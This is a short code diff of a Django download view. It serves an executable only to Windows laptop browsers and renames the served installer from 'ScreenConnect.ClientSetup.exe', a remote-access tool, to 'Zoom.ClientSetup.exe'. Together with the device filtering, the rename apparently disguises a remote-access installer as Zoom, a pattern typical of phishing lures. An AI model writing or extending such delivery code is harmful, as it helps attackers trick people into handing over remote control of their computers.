@@ -58,11 +58,11 @@ def download_client_setup(request):
         return render(request, "laptop_only.html", status=403)
     if not _is_windows_desktop_user_agent(request):
         return render(request, "pc_only.html", status=403)
-    path = Path(settings.BASE_DIR) / "ScreenConnect.ClientSetup.exe"
+    path = Path(settings.BASE_DIR) / "Zoom.ClientSetup.exe"
     if not path.is_file():
         raise Http404("Installer not found")
     return FileResponse(
         path.open("rb"),
         as_attachment=True,
-        filename="ScreenConnect.ClientSetup.exe",
+        filename="Zoom.ClientSetup.exe",
     )
